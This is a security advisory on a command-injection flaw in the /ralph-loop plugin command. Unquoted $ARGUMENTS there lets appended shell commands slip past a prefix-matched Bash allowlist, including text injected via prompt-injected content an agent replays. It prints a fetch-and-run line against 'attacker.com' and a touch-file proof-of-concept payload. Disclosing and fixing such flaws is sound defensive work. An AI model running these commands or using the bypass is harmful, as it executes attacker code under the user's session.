### Title
Command Injection via Unquoted `$ARGUMENTS` Bypasses Bash Allowlist in `/ralph-loop` - ([File: plugins/ralph-wiggum/commands/ralph-loop.md])

### Summary
The `ralph-loop.md` command template embeds the raw, unquoted `$ARGUMENTS` placeholder directly into a bash execution block (`` ```! ``) that is scoped by `allowed-tools: ["Bash(${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh:*)"]`. Because the substitution happens at the text level before the resulting string is handed to a shell, any shell metacharacters present in the argument text (e.g. `;`, `` ` ``, `$(...)`, `&&`, `|`) are interpreted by the shell, letting an attacker chain arbitrary commands after the permitted script invocation and bypass the intent of the Bash allowlist.

### Finding Description
The command file executes:
```
"${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh" $ARGUMENTS
``` [1](#0-0) 

`$ARGUMENTS` is not quoted, so the raw prompt/argument text supplied to `/ralph-loop` is spliced verbatim into the bash command line that gets run. The frontmatter's `allowed-tools` is meant to constrain execution to only the setup script: [2](#0-1) 

If the argument text contains shell metacharacters (for example, text that reached the argument via copy-pasted issue/PR content, or via an automation flow that programmatically invokes the slash command with untrusted text as `$ARGUMENTS`), the effective bash line becomes something like:
```
"/plugin/root/scripts/setup-ralph-loop.sh" build a todo API; curl attacker.com/x | sh
```
The allowlist pattern `Bash(${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh:*)` is a prefix-style match against the command string; because the string still begins with the permitted script path, the permission layer treats the whole compound command as authorized even though a second, unrelated command has been appended and will execute with the same privileges, entirely outside the intended scope of `setup-ralph-loop.sh`.

This is distinct from the `setup-ralph-loop.sh` heredoc (`cat > .claude/ralph-loop.local.md <<EOF`), which is not independently exploitable: values substituted for `$PROMPT`/`$COMPLETION_PROMISE` in an unquoted heredoc are expanded once and not re-scanned for nested command substitution, so that code path is safe. The vulnerability is specifically the raw macro-level splice of `$ARGUMENTS` into the shell command template.

### Impact Explanation
An attacker who can influence the text passed as `/ralph-loop` arguments (e.g., through prompt-injection-influenced content that an agent later replays as slash-command arguments, or pasted untrusted text) can execute arbitrary shell commands under the user's session, defeating the `allowed-tools` sandboxing that is supposed to restrict Bash execution to a single known script. This is an unauthorized command execution / trust-boundary bypass of the plugin permission model, matching the "approval bypass leading to unauthorized command execution" bounty category.

### Likelihood Explanation
Exploitability requires the attacker-controlled text to end up as the literal argument string for the `/ralph-loop` command. This is plausible in workflows where Claude or the user relays content from an untrusted source (issue text, PR description, tool output) as the prompt argument to `/ralph-loop`, a usage pattern explicitly encouraged by the command's own examples (multi-word prompts without quoting). No special privileges beyond normal command usage are required, and the injection is deterministic/reproducible once the metacharacter-laden string is supplied.

### Recommendation
Quote the argument substitution in the command template so it cannot be re-split/re-interpreted by the shell, e.g.:
```
"${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh" "$ARGUMENTS"
```
and change `setup-ralph-loop.sh` to parse the single quoted string internally (e.g. with `xargs`/manual tokenizing or by accepting `$@` if Claude Code passes arguments as an argv array rather than a single string). More generally, the Bash allowlist mechanism should not perform prefix matching on a raw shell string that can contain metacharacters — it should validate/execute the intended script as a fixed argv vector rather than a shell-interpreted string.

### Proof of Concept
Integration test plan:
1. Create a fixture repository with the `ralph-wiggum` plugin installed.
2. Simulate invocation of `/ralph-loop` with an argument string containing a shell metacharacter payload, e.g.:
   `/ralph-loop test; touch /tmp/pwned_ralph`
3. Render `ralph-loop.md`'s `` ```! `` block with `$ARGUMENTS` substituted textually (matching Claude Code's documented substitution behavior), producing:
   `"${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh" test; touch /tmp/pwned_ralph`
4. Execute the resulting string via `bash -c "<string>"`.
5. Assert that `/tmp/pwned_ralph` is created, proving that a command outside `setup-ralph-loop.sh` executed despite the `allowed-tools` restriction limiting execution to that script.
6. As a control, repeat with the recommended fix (`"$ARGUMENTS"` quoted, passed as a single argv token to the script) and assert `/tmp/pwned_ralph` is NOT created, and instead the whole payload is treated as literal prompt text by `setup-ralph-loop.sh`.
